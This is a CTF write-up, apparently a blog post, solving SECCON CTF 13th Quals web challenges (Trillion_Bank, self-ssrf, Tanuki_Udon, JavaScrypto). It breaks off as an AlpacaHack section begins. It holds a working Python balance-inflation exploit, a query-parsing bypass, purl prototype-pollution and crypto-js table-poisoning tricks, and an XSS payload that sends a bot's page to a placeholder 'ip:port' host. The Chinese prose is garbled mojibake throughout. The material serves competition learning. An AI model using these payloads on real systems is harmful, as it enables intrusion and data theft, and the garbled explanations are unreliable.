[{"content":"SECCON CTF 13th Quals Trillion_Bank é¢˜ç›®ä»£ç ï¼š\nimport fastify from \u0026#34;fastify\u0026#34;; import crypto from \u0026#34;node:crypto\u0026#34;; import fs from \u0026#34;node:fs/promises\u0026#34;; import db from \u0026#34;./db.js\u0026#34;; const FLAG = process.env.FLAG ?? console.log(\u0026#34;No flag\u0026#34;) ?? process.exit(1); const TRILLION = 1_000_000_000_000; const app = fastify(); app.register(await import(\u0026#34;@fastify/jwt\u0026#34;), { secret: crypto.randomBytes(32), cookie: { cookieName: \u0026#34;session\u0026#34; }, }); app.register(await import(\u0026#34;@fastify/cookie\u0026#34;)); const names = new Set(); const auth = async (req, res) =\u0026gt; { try { await req.jwtVerify(); } catch { return res.status(401).send({ msg: \u0026#34;Unauthorized\u0026#34; }); } }; app.post(\u0026#34;/api/register\u0026#34;, async (req, res) =\u0026gt; { const name = String(req.body.name); if (!/^[a-z0-9]+$/.test(name)) { res.status(400).send({ msg: \u0026#34;Invalid name\u0026#34; }); return; } if (names.has(name)) { res.status(400).send({ msg: \u0026#34;Already exists\u0026#34; }); return; } names.add(name); const [result] = await db.query(\u0026#34;INSERT INTO users SET ?\u0026#34;, { name, balance: 10, }); res .setCookie(\u0026#34;session\u0026#34;, await res.jwtSign({ id: result.insertId })) .send({ msg: \u0026#34;Succeeded\u0026#34; }); }); app.get(\u0026#34;/api/me\u0026#34;, { onRequest: auth }, async (req, res) =\u0026gt; { try { const [{ 0: { balance } }] = await db.query(\u0026#34;SELECT * FROM users WHERE id = ?\u0026#34;, [req.user.id]); req.user.balance = balance; } catch (err) { return res.status(500).send({ msg: err.message }); } if (req.user.balance \u0026gt;= TRILLION) { req.user.flag = FLAG; // ğŸ’° } res.send(req.user); }); app.post(\u0026#34;/api/transfer\u0026#34;, { onRequest: auth }, async (req, res) =\u0026gt; { const recipientName = String(req.body.recipientName); if (!names.has(recipientName)) { res.status(404).send({ msg: \u0026#34;Not found\u0026#34; }); return; } const [{ 0: { id } }] = await db.query(\u0026#34;SELECT * FROM users WHERE name = ?\u0026#34;, [recipientName]); if (id === req.user.id) { res.status(400).send({ msg: \u0026#34;Self-transfer is not allowed\u0026#34; }); return; } const amount = parseInt(req.body.amount); if (!isFinite(amount) || amount \u0026lt;= 0) { res.status(400).send({ msg: \u0026#34;Invalid amount\u0026#34; }); return; } const conn = await db.getConnection(); try { await conn.beginTransaction(); const [{ 0: { balance } }] = await conn.query(\u0026#34;SELECT * FROM users WHERE id = ? FOR UPDATE\u0026#34;, [ req.user.id, ]); if (amount \u0026gt; balance) { throw new Error(\u0026#34;Invalid amount\u0026#34;); } await conn.query(\u0026#34;UPDATE users SET balance = balance - ? WHERE id = ?\u0026#34;, [ amount, req.user.id, ]); await conn.query(\u0026#34;UPDATE users SET balance = balance + ? WHERE name = ?\u0026#34;, [ amount, recipientName, ]); await conn.commit(); } catch (err) { await conn.rollback(); return res.status(500).send({ msg: err.message }); } finally { db.releaseConnection(conn); } res.send({ msg: \u0026#34;Succeeded\u0026#34; }); }); app.get(\u0026#34;/\u0026#34;, async (req, res) =\u0026gt; { const html = await fs.readFile(\u0026#34;index.html\u0026#34;); res.type(\u0026#34;text/html; charset=utf-8\u0026#34;).send(html); }); app.listen({ port: 3000, host: \u0026#34;0.0.0.0\u0026#34; }); éœ€è¦æ‹¿åˆ°1000000000000ã€‚\nè½¬è´¦æ—¶å‘é€æ–¹æ ¹æ®idæ‰£é™¤ä½™é¢ï¼Œæ¥æ”¶æ–¹æ ¹æ®nameå¢åŠ ä½™é¢ã€‚è™½ç„¶åç«¯è®¾ç½®ç¦æ­¢æ³¨å†ŒåŒåç”¨æˆ·ï¼Œä½†è°ƒç”¨mysqlæ—¶å¹¶æ²¡æœ‰éªŒè¯æ˜¯å¦æœ‰åŒåç”¨æˆ·ã€‚\næ•°æ®åº“ä½¿ç”¨TEXTç±»å‹ä¿å­˜nameï¼ŒTEXTæœ€å¤§é•¿åº¦ä¸º65535ï¼Œdockeré…ç½®äº†mysqlå‚æ•°--sql_modeä¸ºç©ºï¼Œæ‰€ä»¥å½“æ•°æ®å‘ç”Ÿæº¢å‡ºæ—¶ä¸ä¼šæŠ¥é”™ç›´æ¥æˆªæ–­ã€‚å› æ­¤å¯ä»¥åœ¨mysqlä¸­æ’å…¥åŒåç”¨æˆ·ã€‚\nexp:\nimport requests import time url = \u0026#39;\u0026#39; base_name = \u0026#39;z\u0026#39;*65535 def reg(name : str) -\u0026gt; tuple[str, str, str]: res1 = requests.post(url=url + \u0026#39;/api/register\u0026#39;, json={\u0026#34;name\u0026#34; : base_name}) jwt_1 = res1.headers.get(\u0026#39;set-cookie\u0026#39;).split(\u0026#39;session=\u0026#39;, 1)[-1].split(\u0026#39;;\u0026#39;, 1)[0] res2 = requests.post(url=url + \u0026#39;/api/register\u0026#39;, json={\u0026#34;name\u0026#34; : base_name + name}) jwt_2 = res2.headers.get(\u0026#39;set-cookie\u0026#39;).split(\u0026#39;session=\u0026#39;, 1)[-1].split(\u0026#39;;\u0026#39;, 1)[0] res3 = requests.post(url=url + \u0026#39;/api/register\u0026#39;, json={\u0026#34;name\u0026#34; : base_name + name + name}) jwt_3 = res3.headers.get(\u0026#39;set-cookie\u0026#39;).split(\u0026#39;session=\u0026#39;, 1)[-1].split(\u0026#39;;\u0026#39;, 1)[0] return (jwt_1, jwt_2, jwt_3) if __name__ == \u0026#39;__main__\u0026#39;: jwt_1, jwt_2, jwt_3 = reg(\u0026#39;ajdjsbvkj\u0026#39;) balance = 10 while (balance * 2 - 10) \u0026lt; 1_000_000_000_000: time.sleep(0.5) res = requests.post(url=url + \u0026#39;/api/transfer\u0026#39;, json={\u0026#34;recipientName\u0026#34; : base_name, \u0026#34;amount\u0026#34; : balance}, cookies={\u0026#34;session\u0026#34; : jwt_2}) res = requests.post(url=url + \u0026#39;/api/transfer\u0026#39;, json={\u0026#34;recipientName\u0026#34; : base_name, \u0026#34;amount\u0026#34; : balance}, cookies={\u0026#34;session\u0026#34; : jwt_3}) balance = balance * 2 print(balance * 2 - 10, end=\u0026#39;\\r\u0026#39;) print(jwt_1) self-ssrf é¢˜ç›®ä»£ç ï¼š\nimport express from \u0026#34;express\u0026#34;; const PORT = 3000; const LOCALHOST = new URL(`http://localhost:${PORT}`); const FLAG = Bun.env.FLAG!!; const app = express(); app.use(\u0026#34;/\u0026#34;, (req, res, next) =\u0026gt; { if (req.query.flag === undefined) { const path = \u0026#34;/flag?flag=guess_the_flag\u0026#34;; res.send(`Go to \u0026lt;a href=\u0026#34;${path}\u0026#34;\u0026gt;${path}\u0026lt;/a\u0026gt;`); } else next(); }); app.get(\u0026#34;/flag\u0026#34;, (req, res) =\u0026gt; { res.send( req.query.flag === FLAG // Guess the flag ? `Congratz! The flag is \u0026#39;${FLAG}\u0026#39;.` : `\u0026lt;marquee\u0026gt;ğŸš©ğŸš©ğŸš©\u0026lt;/marquee\u0026gt;` ); }); app.get(\u0026#34;/ssrf\u0026#34;, async (req, res) =\u0026gt; { try { const url = new URL(req.url, LOCALHOST); if (url.hostname !== LOCALHOST.hostname) { res.send(\u0026#34;Try harder 1\u0026#34;); return; } if (url.protocol !== LOCALHOST.protocol) { res.send(\u0026#34;Try harder 2\u0026#34;); return; } url.pathname = \u0026#34;/flag\u0026#34;; url.searchParams.append(\u0026#34;flag\u0026#34;, FLAG); res.send(await fetch(url).then((r) =\u0026gt; r.text())); } catch { res.status(500).send(\u0026#34;:(\u0026#34;); } }); app.listen(PORT); è®¿é—®serveréœ€è¦å¸¦æœ‰flagå‚æ•°ï¼Œè€Œssrfä¹Ÿä¼šæ·»åŠ ä¸€ä¸ªflagå‚æ•°ï¼Œæœ‰é‡å¤é”®æ—¶expressä¼šç”¨é€—å·æ‹¼æ¥:\n/?flag=1\u0026amp;flag=flag -\u0026gt; req.query.flag = \u0026#39;1,flag\u0026#39; expressè§£æquery å…ˆè§£æurlï¼Œéšåå¤„ç†url.queryï¼Œå¹¶èµ‹å€¼ç»™req.query\n// express.middleware.query return function query(req, res, next){ if (!req.query) { var val = parseUrl(req).query; req.query = queryparse(val, opts); } next(); }; expressè§£æqueryä½¿ç”¨çš„æ˜¯qsåº“ã€‚\nqueryparseä»£ç å¦‚ä¸‹ï¼š\n// qs.parse module.exports = function (str, opts) { var options = normalizeParseOptions(opts); if (str === \u0026#39;\u0026#39; || str === null || typeof str === \u0026#39;undefined\u0026#39;) { return options.plainObjects ? Object.create(null) : {}; } var tempObj = typeof str === \u0026#39;string\u0026#39; ? parseValues(str, options) : str; var obj = options.plainObjects ? Object.create(null) : {}; // Iterate over the keys and setup the new object var keys = Object.keys(tempObj); for (var i = 0; i \u0026lt; keys.length; ++i) { var key = keys[i]; var newObj = parseKeys(key, tempObj[key], options, typeof str === \u0026#39;string\u0026#39;); obj = utils.merge(obj, newObj, options); } if (options.allowSparse === true) { return obj; } return utils.compact(obj); }; parseValueså‡½æ•°å°†å„é”®çš„å€¼è§£æï¼ŒparseKeyså‡½æ•°å°†é”®åè§£æï¼Œæœ€åmergeåˆ°ä¸€èµ·ã€‚\nparseValueså‡½æ•°å…³é”®ä»£ç å¦‚ä¸‹ï¼š\nvar parseValues = function parseQueryStringValues(str, options) { var obj = { __proto__: null }; var cleanStr = options.ignoreQueryPrefix ? str.replace(/^\\?/, \u0026#39;\u0026#39;) : str; cleanStr = cleanStr.replace(/%5B/gi, \u0026#39;[\u0026#39;).replace(/%5D/gi, \u0026#39;]\u0026#39;); var limit = options.parameterLimit === Infinity ? undefined : options.parameterLimit; var parts = cleanStr.split(options.delimiter, limit); var skipIndex = -1; // Keep track of where the utf8 sentinel was found var i; ...... for (i = 0; i \u0026lt; parts.length; ++i) { if (i === skipIndex) { continue; } var part = parts[i]; var bracketEqualsPos = part.indexOf(\u0026#39;]=\u0026#39;); var pos = bracketEqualsPos === -1 ? part.indexOf(\u0026#39;=\u0026#39;) : bracketEqualsPos + 1; var key, val; if (pos === -1) { key = options.decoder(part, defaults.decoder, charset, \u0026#39;key\u0026#39;); val = options.strictNullHandling ? null : \u0026#39;\u0026#39;; } else { key = options.decoder(part.slice(0, pos), defaults.decoder, charset, \u0026#39;key\u0026#39;); val = utils.maybeMap( parseArrayValue(part.slice(pos + 1), options), function (encodedVal) { return options.decoder(encodedVal, defaults.decoder, charset, \u0026#39;value\u0026#39;); } ); } ...... if (part.indexOf(\u0026#39;[]=\u0026#39;) \u0026gt; -1) { val = isArray(val) ? [val] : val; } var existing = has.call(obj, key); if (existing \u0026amp;\u0026amp; options.duplicates === \u0026#39;combine\u0026#39;) { obj[key] = utils.combine(obj[key], val); } else if (!existing || options.duplicates === \u0026#39;last\u0026#39;) { obj[key] = val; } } return obj; }; options.duplicatesé»˜è®¤æ˜¯combineï¼Œæ‰€ä»¥é‡å¤é”®ä¼šç”¨é€—å·æ‹¼æ¥ã€‚\nè§£ææ—¶å…ˆé€šè¿‡\u0026amp;åˆ†å‰²ï¼Œç„¶åå†ç”¨=åˆ†å‰²é”®å’Œå€¼ã€‚\næ³¨æ„åˆ†å‰²æ–¹å¼ï¼š\nvar bracketEqualsPos = part.indexOf(\u0026#39;]=\u0026#39;); var pos = bracketEqualsPos === -1 ? part.indexOf(\u0026#39;=\u0026#39;) : bracketEqualsPos + 1; å½“å‡ºç°]=æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨]=æ‰€åœ¨çš„ç´¢å¼•ã€‚è€Œå†…ç½®åº“çš„URLæ˜¯æ ¹æ®ç¬¬ä¸€ä¸ª=åˆ†å‰²çš„ï¼š\nnew URL(\u0026#39;http://localhost:3000/asd?flag=]=asd\u0026#39;); // searchParams: URLSearchParams { \u0026#39;flag\u0026#39; =\u0026gt; \u0026#39;]=asd\u0026#39; } è§£æ³• URL()ä¼šå¯¹é™¤äº†ä½œä¸ºåˆ†éš”ç¬¦ä»¥å¤–çš„=è¿›è¡ŒURLç¼–ç ã€‚qsåªä¼šå¯¹[]è¿›è¡ŒURLè§£ç ï¼š\ncleanStr = cleanStr.replace(/%5B/gi, \u0026#39;[\u0026#39;).replace(/%5D/gi, \u0026#39;]\u0026#39;); å½“è¾“å…¥ssrf/?flag[=]=asdæ—¶ï¼Œä¼šè¿›è¡Œä»¥ä¸‹å¤„ç†ï¼š\n// qsç¬¬ä¸€æ¬¡è§£æ req.query = { \u0026#34;flag\u0026#34; : { \u0026#34;=\u0026#34; : \u0026#34;asd\u0026#34; } } // URL()è§£æ url = \u0026#39;http://localhost:3000/flag?flag[=%5D%3Dasd\u0026amp;flag=SECCON\u0026#39; // qsç¬¬äºŒæ¬¡è§£æ req.query = { \u0026#34;flag\u0026#34; : \u0026#34;SECCON\u0026#34;, \u0026#34;flag[\u0026#34; : \u0026#34;]=asd\u0026#34; } Tanuki_Udon ä¸€ä¸ªblogç³»ç»Ÿï¼Œæ”¯æŒmarkdownæ ¼å¼ï¼Œå°è¯•xssã€‚\nmarkdownå¤„ç†å‡½æ•°ï¼š\nconst escapeHtml = (content) =\u0026gt; { return content .replaceAll(\u0026#39;\u0026amp;\u0026#39;, \u0026#39;\u0026amp;amp;\u0026#39;) .replaceAll(`\u0026#34;`, \u0026#39;\u0026amp;quot;\u0026#39;) .replaceAll(`\u0026#39;`, \u0026#39;\u0026amp;#39;\u0026#39;) .replaceAll(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;lt;\u0026#39;) .replaceAll(\u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026amp;gt;\u0026#39;); } const markdown = (content) =\u0026gt; { const escaped = escapeHtml(content); return escaped .replace(/!\\[([^\u0026#34;]*?)\\]\\(([^\u0026#34;]*?)\\)/g, `\u0026lt;img alt=\u0026#34;$1\u0026#34; src=\u0026#34;$2\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;`) .replace(/\\[(.*?)\\]\\(([^\u0026#34;]*?)\\)/g, `\u0026lt;a href=\u0026#34;$2\u0026#34;\u0026gt;$1\u0026lt;/a\u0026gt;`) .replace(/\\*\\*(.*?)\\*\\*/g, `\u0026lt;strong\u0026gt;$1\u0026lt;/strong\u0026gt;`) .replace(/ $/mg, `\u0026lt;br\u0026gt;`); } module.exports = markdown; é—®é¢˜åœ¨äºreplaceæ‰§è¡Œæ˜¯æœ‰é¡ºåºçš„ï¼Œå‰ä¸€ä¸ªçš„imgæ ‡ç­¾çš„å¼•å·å¯ä»¥é€šè¿‡aæ ‡ç­¾ç ´åã€‚\naæ ‡ç­¾çš„[]å†…éƒ¨åŒ¹é…çš„æ˜¯.*ï¼ŒåŒ…å®¹æ€§å¼ºï¼Œå¯ä»¥ç”¨è¿™ä¸ªåˆ†å‰²imgçš„å¼•å·ã€‚\nå†™ä¸€ä¸ªæµ‹è¯•è„šæœ¬ï¼š\nconst escapeHtml = (content) =\u0026gt; { return content .replaceAll(\u0026#39;\u0026amp;\u0026#39;, \u0026#39;\u0026amp;amp;\u0026#39;) .replaceAll(`\u0026#34;`, \u0026#39;\u0026amp;quot;\u0026#39;) .replaceAll(`\u0026#39;`, \u0026#39;\u0026amp;#39;\u0026#39;) .replaceAll(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;lt;\u0026#39;) .replaceAll(\u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026amp;gt;\u0026#39;); } const markdown = (content) =\u0026gt; { var escaped = escapeHtml(content); escaped = escaped.replace(/!\\[([^\u0026#34;]*?)\\]\\(([^\u0026#34;]*?)\\)/g, `\u0026lt;img alt=\u0026#34;$1\u0026#34; src=\u0026#34;$2\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;`); console.log(escaped); escaped = escaped.replace(/\\[(.*?)\\]\\(([^\u0026#34;]*?)\\)/g, `\u0026lt;a href=\u0026#34;$2\u0026#34;\u0026gt;$1\u0026lt;/a\u0026gt;`); console.log(escaped); escaped = escaped.replace(/\\*\\*(.*?)\\*\\*/g, `\u0026lt;strong\u0026gt;$1\u0026lt;/strong\u0026gt;`); console.log(escaped); escaped = escaped.replace(/ $/mg, `\u0026lt;br\u0026gt;`); console.log(escaped); return escaped } content = \u0026#39;![]([)]()\u0026#39; markdown(content) /* \u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;[\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;]() \u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34;\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34;\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34;\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt; */ æ–°ç”Ÿæˆçš„aæ ‡ç­¾çš„hrefå±æ€§é€ƒé€¸å‡ºäº†åŒå¼•å·ï¼Œä¸”ä¾ç„¶åœ¨imgæ ‡ç­¾å†…ã€‚å¯ä»¥ä½¿ç”¨onerroræ‰§è¡Œjsä»£ç ã€‚\npayload:\n![]([)]( onerror=alert`1` class=)\r/*\r\u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;[\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;]( onerror=alert`1` class=)\r\u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34; onerror=alert`1` class=\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt;\r\u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34; onerror=alert`1` class=\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt;\r\u0026lt;img alt=\u0026#34;\u0026#34; src=\u0026#34;\u0026lt;a href=\u0026#34; onerror=alert`1` class=\u0026#34;\u0026gt;\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\u0026lt;/a\u0026gt;\r*/ ä¸è¿‡ç”±äºonerrorå¤„åœ¨markdown aæ ‡ç­¾çš„hrefå±æ€§ä½ç½®ï¼Œä¸èƒ½æœ‰)ï¼Œæ‰€ä»¥ä½¿ç”¨javascriptåè®®ï¼Œå°±å¯ä»¥é€šè¿‡urlç¼–ç ç»•è¿‡å­—ç¬¦é™åˆ¶äº†ã€‚\næ‹¿flagéœ€è¦çŸ¥é“flagçš„noteidï¼Œè¦ç”¨botçš„cookieè®¿é—®/è·å¾—ï¼Œcookieæ˜¯Http Onlyçš„ï¼Œæ‰€ä»¥ç›´æ¥ç”¨fetchè¯»å–é¡µé¢å†…å®¹ã€‚\njs payloadï¼š\nvar d;fetch(\u0026#34;/\u0026#34;).then((r) =\u0026gt; r.text()).then((data) =\u0026gt; {d = data});setTimeout(() =\u0026gt; {fetch(\u0026#39;http://ip:port?data=\u0026#39; + encodeURI(d))}, 500); xss payload:\n![1]([)]( onerror=location=`javascript:var%20d%3Bfetch%28%22%2F%22%29%2Ethen%28%28r%29%20%3D%3E%20r%2Etext%28%29%29%2Ethen%28%28data%29%20%3D%3E%20%7Bd%20%3D%20data%7D%29%3BsetTimeout%28%28%29%20%3D%3E%20%7Bfetch%28%27http%3A%2F%2Fip%3Aport%3Fdata%3D%27%20%2B%20encodeURI%28d%29%29%7D%2C%20500%29%3B` class=) æ‹¿åˆ°noteidç›´æ¥è®¿é—®å³å¯ã€‚\nJavaScrypto åˆæ˜¯ä¸€ä¸ªnoteç³»ç»Ÿï¼ŒæœåŠ¡å™¨åªä¿å­˜AES CBCåŠ å¯†çš„å¯†æ–‡å’Œivï¼Œkeyä¿å­˜åœ¨ç”¨æˆ·çš„localstorageä¸­ã€‚\nindex.htmlä»£ç å¦‚ä¸‹ï¼š\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;JavaScrypto\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.tailwindcss.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js\u0026#34; integrity=\u0026#34;sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ==\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; referrerpolicy=\u0026#34;no-referrer\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/purl/2.3.1/purl.min.js\u0026#34; integrity=\u0026#34;sha512-xbWNJpa0EduIPOwctW2N6KjW1KAWai6wEfiC3bafkJZyd0X3Q3n5yDTXHd21MIostzgLTwhxjEH+l9a5j3RB4A==\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; referrerpolicy=\u0026#34;no-referrer\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;note.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-orange-100 h-full font-mono gap-4\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;p-4 text-xl text-blue-600\u0026#34;\u0026gt; JavaS\u0026lt;span class=\u0026#34;text-yellow-600\u0026#34;\u0026gt;crypto\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;pre id=\u0026#34;note\u0026#34; class=\u0026#34;p-4 bg-slate-100 rounded w-1/2 text-center\u0026#34;\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;textarea name=\u0026#34;noteInput\u0026#34; id=\u0026#34;noteInput\u0026#34; class=\u0026#34;w-1/2 p-4\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button id=\u0026#34;createNote\u0026#34; class=\u0026#34;p-2 bg-green-200 rounded\u0026#34;\u0026gt;Create\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; const key = getOrCreateKey(); const id = purl().param().id || localStorage.getItem(\u0026#39;currentId\u0026#39;); if (id \u0026amp;\u0026amp; typeof id === \u0026#39;string\u0026#39;) { readNote({ id, key, }).then(content =\u0026gt; { if (content) { localStorage.setItem(\u0026#39;currentId\u0026#39;, id); document.getElementById(\u0026#39;note\u0026#39;).innerHTML = content; } else { document.getElementById(\u0026#39;note\u0026#39;).innerHTML = \u0026#39;Failed to read\u0026#39;; } }); } else { document.getElementById(\u0026#39;note\u0026#39;).innerHTML = \u0026#39;No note\u0026#39;; } const onCreate = () =\u0026gt; { const content = document.getElementById(\u0026#39;noteInput\u0026#39;).value; createNote({ plaintext: content, key, }).then(id =\u0026gt; { localStorage.setItem(\u0026#39;currentId\u0026#39;, id); location.href = `/?id=${id}`; }); } document.getElementById(\u0026#39;createNote\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, onCreate); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; note.jsä»£ç å¦‚ä¸‹ï¼š\nconst getOrCreateKey = () =\u0026gt; { if (!localStorage.getItem(\u0026#39;key\u0026#39;)) { const rawKey = CryptoJS.lib.WordArray.random(16); localStorage.setItem(\u0026#39;key\u0026#39;, rawKey.toString(CryptoJS.enc.Base64)); } return localStorage.getItem(\u0026#39;key\u0026#39;); } const encryptNote = ({ plaintext, key }) =\u0026gt; { const rawKey = CryptoJS.enc.Base64.parse(key); const rawIv = CryptoJS.lib.WordArray.random(16); const rawSalt = CryptoJS.lib.WordArray.random(16); const rawCiphertext = CryptoJS.AES.encrypt(plaintext, rawKey, { iv: rawIv, salt: rawSalt, }).ciphertext; return { iv: rawIv.toString(CryptoJS.enc.Base64), ciphertext: rawCiphertext.toString(CryptoJS.enc.Base64), } } const decryptNote = ({ key, iv, ciphertext }) =\u0026gt; { const rawKey = CryptoJS.enc.Base64.parse(key); const rawIv = CryptoJS.enc.Base64.parse(iv); const rawPlaintext = CryptoJS.AES.decrypt(ciphertext, rawKey, { iv: rawIv, }); return rawPlaintext.toString(CryptoJS.enc.Latin1); } const createNote = async ({ plaintext, key }) =\u0026gt; { const cipherParams = encryptNote({ plaintext, key }); const { id } = await fetch(\u0026#39;/note\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: JSON.stringify(cipherParams), headers: { \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39; } }).then(r =\u0026gt; r.json()); return id; } const readNote = async ({ id, key }) =\u0026gt; { const cipherParams = await fetch(`/note/${id}`).then(r =\u0026gt; r.json()); const { iv, ciphertext } = cipherParams; return decryptNote({ key, iv, ciphertext }); } ä½¿ç”¨purlåº“è§£æurlæå–idï¼Œ2.3.1ç‰ˆæœ¬å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚\npayload:\n/?__proto__[asd]=asd#__proto__[test]=test botä¼šå°†flagä¿å­˜åœ¨noteä¸­ï¼Œéœ€è¦çŸ¥é“idæ¥è·å–å¯†æ–‡å’Œivï¼Œä»¥åŠkeyæ¥è§£å¯†flagã€‚\nbotè®¿é—®noteæ—¶ï¼Œåªä¼šç”¨è‡ªå·±çš„keyæ¥è§£å¯†ã€‚è¦é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ¥ä½¿botå¯ä»¥æŸ¥çœ‹æˆ‘ä»¬å†™çš„å†…å®¹ã€‚\né¢˜ç›®ä½¿ç”¨äº†crypto-jsè¿›è¡ŒAESåŠ è§£å¯†ï¼Œbase64è§£å¯†æ—¶å¯ä»¥æ±¡æŸ“_reverseMapï¼Œhttps://github.com/brix/crypto-js/blob/develop/src/enc-base64.js#L76\nbase64è§£å¯†ä»£ç ï¼š\nparse: function (base64Str) { // Shortcuts var base64StrLength = base64Str.length; var map = this._map; var reverseMap = this._reverseMap; if (!reverseMap) { reverseMap = this._reverseMap = []; for (var j = 0; j \u0026lt; map.length; j++) { reverseMap[map.charCodeAt(j)] = j; } } // Ignore padding var paddingChar = map.charAt(64); if (paddingChar) { var paddingIndex = base64Str.indexOf(paddingChar); if (paddingIndex !== -1) { base64StrLength = paddingIndex; } } // Convert return parseLoop(base64Str, base64StrLength, reverseMap); }, _map: \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#39; }; function parseLoop(base64Str, base64StrLength, reverseMap) { var words = []; var nBytes = 0; for (var i = 0; i \u0026lt; base64StrLength; i++) { if (i % 4) { var bits1 = reverseMap[base64Str.charCodeAt(i - 1)] \u0026lt;\u0026lt; ((i % 4) * 2); var bits2 = reverseMap[base64Str.charCodeAt(i)] \u0026gt;\u0026gt;\u0026gt; (6 - (i % 4) * 2); var bitsCombined = bits1 | bits2; words[nBytes \u0026gt;\u0026gt;\u0026gt; 2] |= bitsCombined \u0026lt;\u0026lt; (24 - (nBytes % 4) * 8); nBytes++; } } return WordArray.create(words, nBytes); } å¯ä»¥é€šè¿‡æ±¡æŸ“_reverseMapæ¥å½±å“è§£å¯†ç»“æœã€‚ç”±äºkeyçš„å€¼ä¸ç¡®å®šï¼Œæ‰€ä»¥ä¸€èˆ¬çš„å˜è¡¨è§£å¯†å‡ºæ¥çš„keyä¾ç„¶ä¸ç¡®å®šã€‚\nåªæœ‰é€šè¿‡å°†è¡¨ä¸­æ‰€æœ‰å­—ç¬¦éƒ½æŒ‡å‘ä¸€ä¸ªç›¸åŒçš„æ•°å­—ã€‚æ¯”å¦‚éƒ½æŒ‡å‘0ï¼Œæ­¤æ—¶keyå’Œivè§£å¯†åéƒ½æ˜¯0ã€‚è¿™æ ·keyå°±ç¡®å®šäº†ã€‚\nè¿˜è¦ä¿è¯ciphertextèƒ½æ­£å¸¸è§£å¯†ï¼Œbase64è¡¨éœ€è¦æœ‰64ä¸ªå­—ç¬¦ï¼Œè€Œasciiç æœ‰128ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥asciiç å¯ä»¥å®¹çº³ä¸¤å¼ ä¸åŒçš„base64è¡¨ã€‚\nç”Ÿæˆæ–°è¡¨ï¼š\ndef gentable(table_org : str) -\u0026gt; str: table_new = \u0026#34;\u0026#34; for i in range(128): c = chr(i) if c in table_org: continue table_new = table_new + c return table_new table_org = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; table_new = gentable(table_org) å°†xss payloadç”¨ç©ºçš„keyå’Œivè¿›è¡ŒAESåŠ å¯†ç„¶åç”¨æ–°çš„è¡¨ç¼–ç å³å¯ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé€šè¿‡purlè¿›è¡Œæ±¡æŸ“æ—¶æ–°è¡¨ä¸­ä¸èƒ½åŒ…å«[å’Œ=ï¼Œæ‰€ä»¥å…¶å®æ–°è¡¨æ˜¯ç¼ºå¤±äº†ä¸¤ä¸ªå­—ç¬¦çš„ï¼Œæ‰€ä»¥éœ€è¦fuzzå‡ºä¸€ä¸ªåˆé€‚çš„xss payloadã€‚\nAlpacaHack Round 7 Treasure Hunt æœåŠ¡å™¨ä»£ç å¦‚ä¸‹ï¼š\napp.use((req, res, next) =\u0026gt; { res.type(\u0026#34;text\u0026#34;); if (/[flag]/.test(req.url)) { 